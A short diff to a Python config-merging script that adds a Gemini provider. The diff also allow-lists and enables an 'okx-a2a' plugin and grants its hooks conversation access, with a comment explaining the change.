@@ -47,6 +47,12 @@ m.setdefault("providers", {})["gemini"] = {
     "api": "openai-completions",
     "models": [{"id": model, "name": "Gemini"}],
 }
+# trust the okx-a2a plugin and unblock its hooks (needed to process agent runs)
+plugins = cfg.setdefault("plugins", {})
+plugins["allow"] = sorted(set(plugins.get("allow", []) + ["okx-a2a"]))
+oa = plugins.setdefault("entries", {}).setdefault("okx-a2a", {})
+oa["enabled"] = True
+oa.setdefault("hooks", {})["allowConversationAccess"] = True
 os.makedirs(os.path.dirname(p), exist_ok=True)
 json.dump(cfg, open(p, "w"), indent=2)
 print("merged gemini into", p)
